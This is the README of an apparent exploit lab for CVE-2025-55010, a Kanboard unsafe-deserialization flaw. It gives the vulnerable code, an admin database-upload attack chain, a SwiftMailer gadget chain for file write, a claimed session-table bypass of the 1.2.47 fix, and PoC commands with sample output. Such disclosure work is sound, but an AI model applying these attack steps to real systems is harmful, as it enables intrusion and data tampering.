# CVE-2025-55010 - Kanboard Remote Code Execution via Unsafe Deserialization

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel) | dev@exploit-intel.com

## Vulnerability Summary

| Field       | Value                                                |
|-------------|------------------------------------------------------|
| CVE         | CVE-2025-55010                                       |
| Component   | [Kanboard](https://github.com/kanboard/kanboard) — Lightweight project management tool |
| Type        | CWE-502: Deserialization of Untrusted Data           |
| CVSS        | 9.1 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| EPSS        | 2.6% (85.3th percentile)                            |
| Affected    | All versions before 1.2.47                           |
| Fix         | v1.2.47 — commit [`7148ac0`](https://github.com/kanboard/kanboard/commit/7148ac092e5db6b33e0fc35e04bca328d96c1f6f) |
| Author      | Exploit Intelligence Platform (dev@exploit-intel.com)|
| Date        | 2026-02-27                                           |
| Blog Post   | [Three CVEs, One Bypass — CVEForge Gets Real](https://exploit-intel.com/blog/posts/three-cves-one-bypass-cveforge-gets-real/) |

## Vulnerability Details

The vulnerability resides in `ProjectActivityEventFormatter::unserializeEvent()` in `app/Formatter/ProjectActivityEventFormatter.php`:

```php
protected function unserializeEvent($data) {
    if ($data[0] === 'a') {
        return unserialize($data);  // No allowed_classes restriction
    }
    return json_decode($data, true) ?: array();
}
```

The `data` column in the `project_activities` table normally contains JSON. But if the first byte is `a` — the prefix for PHP serialized arrays — it routes through `unserialize()` without restricting which classes can be instantiated. Kanboard bundles SwiftMailer in `libs/swiftmailer/`, which provides gadget chains for arbitrary file writes.

### Attack Chain

An authenticated admin can exploit the built-in database download/upload feature:

```
1. Login as admin → obtain session cookie + CSRF token
2. Download gzip-compressed SQLite database (Settings → Database)
3. Inject PHP-serialized SwiftMailer gadget chain into project_activities.data
4. Upload modified database back to Kanboard
5. View task activity stream → triggers unserialize() on the injected payload
6. SwiftMailer gadget chain executes: __toString() → DiskKeyCache::setString() → file write
```

### Gadget Chain

```
Swift_Mime_SimpleMimeEntity::__toString()
  └→ toString()
       ├→ SimpleHeaderSet::toString()        → "Content-Transfer-Encoding: raw\r\n"
       └→ _bodyToString()
            ├→ DiskKeyCache::hasKey()         → false (no cached file)
            ├→ RawContentEncoder::encodeString($body)  → returns $body unchanged
            └→ DiskKeyCache::setString($nsKey, "body", $content, MODE_WRITE)
                 ├→ _prepareCache()           → mkdir("<target_path>")
                 ├→ _getHandle()              → fopen("<target_path>/body", "w+b")
                 ├→ fwrite($fp, $content)     → WRITES PAYLOAD TO DISK
                 └→ _freeHandle()             → fclose($fp)
```

### Fix (Commit 7148ac0)

```php
// BEFORE (vulnerable):
if ($data[0] === 'a') {
    return unserialize($data);
}

// AFTER (fixed):
if ($data[0] === 'a') {
    return [];  // Ignore legacy events serialized with PHP
}
```

The fix also skips events with empty data in the `format()` method. The `unserialize()` call is completely eliminated for this code path.

## Fix Bypass: Session Table Deserialization

**Status: CONFIRMED** — The v1.2.47 fix is incomplete. An alternative deserialization sink exists in the session handling code.

Kanboard defaults to database-backed PHP sessions (`SESSION_HANDLER='db'`). When PHP calls `session_start()` with a custom session handler, it internally deserializes the data returned by `SessionHandler::read()` — without `allowed_classes` restrictions:

```php
// app/Core/Session/SessionHandler.php
class SessionHandler implements SessionHandlerInterface
{
    public function read($sessionID)
    {
        $result = $this->db->table(self::TABLE)
            ->eq('id', $sessionID)
            ->findOneColumn('data');
        return $result ?: '';  // Returns raw data from sessions table
    }
}

// app/Core/Session/SessionManager.php
public function open()
{
    if (SESSION_HANDLER === 'db') {
        session_set_save_handler(new SessionHandler($this->db), true);
    }
    session_start();  // PHP internally calls unserialize() on the data
}
```

Same prerequisite (admin + DB upload). Same gadget chain (SwiftMailer). Completely different code path. The bypass PoC demonstrates arbitrary file deletion via `Swift_ByteStream_TemporaryFileByteStream::__destruct()` on the **patched** v1.2.47 container.

```
1. Download SQLite database (same as original CVE)
2. Inject PHP-serialized payload into sessions table
3. Upload modified database
4. Send HTTP request with crafted session cookie (KB_SID=<injected_id>)
5. PHP session_start() → SessionHandler::read() → unserialize() → gadget chain fires
```

## Lab Setup

### Architecture

```
┌────────────────────────────────┐  ┌────────────────────────────────┐
│  cve-2025-55010-vulnerable     │  │  cve-2025-55010-patched        │
│                                │  │                                │
│  Kanboard v1.2.46              │  │  Kanboard v1.2.47              │
│  unserialize() — VULN          │  │  unserialize() — REMOVED       │
│  Alpine + nginx + PHP 8.4      │  │  session_start() — STILL VULN  │
│  Port 80 (ext 8880)           │  │  Port 80 (ext 8881)           │
└────────────────────────────────┘  └────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2025-55010

# Build and start
docker compose build
docker compose up -d

# Run the PoC against the vulnerable container (marker mode)
python3 poc/poc.py localhost 8880

# Run the bypass PoC against the patched container
python3 poc/bypass_poc.py

# Cleanup
docker compose down -v
```

### Container Details

| Container | Role | Kanboard Version | Host Port |
|---|---|---|---|
| `cve-2025-55010-vulnerable` | Vulnerable target | **v1.2.46** (`unserialize()` present) | `8880` |
| `cve-2025-55010-patched` | Patched comparison | **v1.2.47** (`unserialize()` removed, sessions still vuln) | `8881` |

### Default Credentials

| Username | Password | Role |
|----------|----------|------|
| `admin` | `admin` | Administrator |

## PoC Usage

### Scripts

| Script | Purpose |
|--------|---------|
| `poc/poc.py` | Full automated exploit chain — deserialization via activity stream |
| `poc/bypass_poc.py` | Fix bypass — deserialization via session table on patched v1.2.47 |
| `poc/generate_payload.php` | SwiftMailer gadget chain payload generator (runs inside container) |
| `poc/generate_session_payload.php` | Session payload generator for bypass (runs inside container) |

### Running the Primary PoC

The PoC automatically discovers the container IP and demonstrates both exploit modes:

```bash
# Auto-detect target, run both modes
python3 poc/poc.py

# Or specify target manually
python3 poc/poc.py <target_host> [port] [mode]
python3 poc/poc.py 172.21.0.2 80 marker      # Marker mode only
python3 poc/poc.py 172.21.0.2 80 filewrite    # File write mode only
```

**Example output (vulnerable target):**

```
======================================================================
CVE-2025-55010: Kanboard Unsafe Deserialization PoC
Target: http://172.21.0.2:80
Mode: marker
======================================================================
[*] Step 1: Logging in as admin...
[+] Login successful. Session: KB_SID=25a97dd9417bd56ac6f7...
[*] Step 2: Setting up test data (project/task/comment)...
[+] Created project (ID: 1)
[+] Created task (ID: 1)
[+] Created comment (ID: 1)
[*] Step 3: Downloading SQLite database...
[+] Downloaded database (10162 bytes compressed)
[+] Decompressed to 405504 bytes
[*] Step 4: Generating marker payload inside container...
[+] Payload generated (3921 bytes)
[*] Step 5: Injecting payload into project_activities table...
[+] Payload injected successfully (3921 bytes)
[*] Step 6: Uploading modified database...
[+] Database uploaded via web (status: 302)
[*] Step 7: Triggering deserialization via activity stream...
[+] Activity page loaded (status: 200, 25736 bytes)

======================================================================
VERIFICATION RESULTS
======================================================================
[+] MARKER FOUND IN RESPONSE: CVE-2025-55010-DESERIALIZATION-PROOF-a6c0ce172b343228
[+] ===== EXPLOIT SUCCESSFUL =====
[+] CVE-2025-55010 vulnerability CONFIRMED
```

### Running the Bypass PoC

The bypass PoC targets the **patched** v1.2.47 container:

```bash
python3 poc/bypass_poc.py
```

**Example output (patched target):**

```
======================================================================
CVE-2025-55010 BYPASS PoC: Session Table Deserialization
======================================================================
[*] Target: http://172.21.0.3:80 (cve-2025-55010-patched)
[+] CONFIRMED: unserialize() REMOVED from ProjectActivityEventFormatter (fix applied)
[+] SESSION_HANDLER defaults to 'db' — database-backed sessions ACTIVE

[*] Step 1: Creating marker file inside container...
[*] Step 2: Generating malicious session payload...
    [+] Gadget: Swift_ByteStream_TemporaryFileByteStream::__destruct() -> unlink()
[*] Step 3: Injecting malicious session into database...
[*] Step 4: Triggering session deserialization...
[*] Step 5: Verifying bypass...

========================================================================
[+] ======= BYPASS SUCCESSFUL =======
[+] Marker file /tmp/bypass_marker.txt was DELETED!
[+]
[+] PROOF CHAIN:
[+]   1. Malicious PHP-serialized data injected into `sessions` table
[+]   2. HTTP request sent with crafted session cookie
[+]   3. PHP session_start() -> SessionHandler::read() -> returned malicious data
[+]   4. PHP internally called unserialize() on the session data (NO allowed_classes!)
[+]   5. Swift_ByteStream_TemporaryFileByteStream object instantiated
[+]   6. __destruct() triggered -> unlink('/tmp/bypass_marker.txt') -> FILE DELETED
```

## Verification: Vulnerable vs Patched

| Attack Vector | Vulnerable (v1.2.46) | Patched (v1.2.47) |
|---|---|---|
| Activity stream deserialization | VULNERABLE — marker in response | **BLOCKED** — `unserialize()` removed |
| File write via DiskKeyCache | VULNERABLE — file created in `/plugins/` | **BLOCKED** |
| **Session table deserialization (bypass)** | **VULNERABLE** | **VULNERABLE** |

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary exploit — activity stream deserialization, Python 3 stdlib only |
| `poc/bypass_poc.py` | Fix bypass — session table deserialization on patched v1.2.47 |
| `poc/generate_payload.php` | SwiftMailer gadget chain payload generator |
| `poc/generate_session_payload.php` | Session bypass payload generator |
| `Dockerfile.vulnerable` | Kanboard v1.2.46 container (vulnerable) |
| `Dockerfile.patched` | Kanboard v1.2.47 container (patched, bypass still works) |
| `docker-compose.yml` | Lab with vulnerable + patched containers |
| `fix.patch` | The CVE-2025-55010 fix patch applied to create the patched container |

## References

- [GitHub Advisory (GHSA-359x-c69j-q64r)](https://github.com/kanboard/kanboard/security/advisories/GHSA-359x-c69j-q64r)
- [Fix Commit 7148ac0](https://github.com/kanboard/kanboard/commit/7148ac092e5db6b33e0fc35e04bca328d96c1f6f)
- [Kanboard Repository](https://github.com/kanboard/kanboard)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-55010)
- [Vulnerable Code](https://github.com/kanboard/kanboard/blob/b033c0e0f982f8158e240bce8ab54c29727f8efe/app/Formatter/ProjectActivityEventFormatter.php#L43-L57)
- [Blog Post: Three CVEs, One Bypass — CVEForge Gets Real](https://exploit-intel.com/blog/posts/three-cves-one-bypass-cveforge-gets-real/)

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-55010 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. Always follow responsible disclosure practices and coordinate with affected vendors before publishing vulnerability details.
